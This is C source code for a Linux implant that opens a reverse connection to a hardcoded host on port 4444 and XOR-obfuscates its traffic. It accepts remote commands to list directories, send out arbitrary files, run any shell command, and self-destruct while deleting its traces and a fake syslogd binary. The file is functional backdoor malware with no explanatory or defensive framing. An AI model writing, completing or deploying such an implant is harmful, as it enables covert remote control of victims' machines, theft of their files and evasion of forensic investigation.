#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SERVER_IP "192.168.65.254"
#define SERVER_PORT 4444
#define BUF_SIZE 2048
#define XOR_KEY 0x55
int sock;

void xor_encrypt_decrypt(char *data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void trim_newline(char *s) {
    size_t len = strlen(s);
    while (len && (s[len - 1] == '\n' || s[len - 1] == '\r'))
        s[--len] = '\0';
}

// Sending response with flushing
int send_response(const char *msg) {
    char buffer[BUF_SIZE];
    strncpy(buffer, msg, BUF_SIZE);
    xor_encrypt_decrypt(buffer, strlen(buffer), XOR_KEY); // Encrypt before sending
    int bytes_sent = send(sock, buffer, strlen(buffer), 0);
    fsync(sock); // Ensure data is sent immediately
    if (bytes_sent < 0) {
        perror("[-] Error sending response");
    }
    return bytes_sent;
}

int list_dir(const char *dir_path) {
    DIR *d = opendir(dir_path);
    if (!d) return -1;

    struct dirent *entry;
    char msg[BUF_SIZE];
    while ((entry = readdir(d)) != NULL) {
        snprintf(msg, BUF_SIZE, "[*] %s\n", entry->d_name);
        send_response(msg);
    }
    closedir(d);

    const char *end_msg = "[*] END\n";
    send_response(end_msg);
    return 0;
}

int send_file(const char *file_path) {
    FILE *fp = fopen(file_path, "rb");
    if (!fp) {
        const char *err = "[-] Failed to open file\n";
        send_response(err);
        return -1;
    }

    char buf[BUF_SIZE];
    size_t n;
    while ((n = fread(buf, 1, BUF_SIZE, fp)) > 0) {
        buf[n] = '\0';  // Null-terminate the chunk
        send_response(buf);  // Use send_response for consistent encryption
    }
    fclose(fp);

    const char *end_msg = "[*] END\n";
    send_response(end_msg);  // Properly send the end message
    return 0;
}



int main() {
    struct sockaddr_in server;
    char buffer[BUF_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Socket");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[-] Connect");
        return 1;
    }

    while (1) {
        memset(buffer, 0, BUF_SIZE);
        int n = read(sock, buffer, BUF_SIZE - 1);
        xor_encrypt_decrypt(buffer, n, 0x55);  // Decrypt the received command

        if (n <= 0) break;
        trim_newline(buffer);

        if (strncmp(buffer, "exit", 4) == 0) break;

        if (strncmp(buffer, "destroy", 7) == 0) {
            char self_path[512];
            ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
            if (len != -1) {
                self_path[len] = '\0';
                remove(self_path);
            }
            remove("/tmp/i");
            remove("/tmp/exfil");
            remove("/usr/bin/syslogd");
            char msg[] = "Implant self-destructed and traces wiped\n";
            xor_encrypt_decrypt(msg, strlen(msg), XOR_KEY);  // Encrypt the message
            send(sock, msg, strlen(msg), 0);
            shutdown(sock, SHUT_WR);
            close(sock);  
            exit(0);
        }

        if (strncmp(buffer, "list ", 5) == 0) {
            char *dir = buffer + 5;
            if (list_dir(dir) < 0)
                send_response("[-] Failed to list directory\n");
            continue;
        }

        if (strncmp(buffer, "exfil ", 6) == 0) {
            char *file = buffer + 6;
            char msg[BUF_SIZE];
        
            // Open the file
            int fd = open(file, O_RDONLY);
            if (fd < 0) {
                const char *err = "[-] Failed to open file\n";
                send_file(err);
                continue;
            }
        
            // Read and send the file contents
            ssize_t n;
            while ((n = read(fd, msg, BUF_SIZE)) > 0) {
                xor_encrypt_decrypt(msg, n, XOR_KEY);  // Encrypt file data
                send(sock, msg, n, 0);  // Send encrypted data
            }
            close(fd);
        
            const char *end_msg = "[*] END\n";
            xor_encrypt_decrypt((char *)end_msg, strlen(end_msg), XOR_KEY);
            send(sock, end_msg, strlen(end_msg), 0);
            continue;
        }

        // fallback: shell command
        FILE *fp = popen(buffer, "r");
        if (!fp) {
            send_response("[-] Command execution failed\n");
        } else {
            while (fgets(buffer, BUF_SIZE, fp)) {
                send_response(buffer);
            }
            pclose(fp);
        }
    }

    close(sock);
    return 0;
}
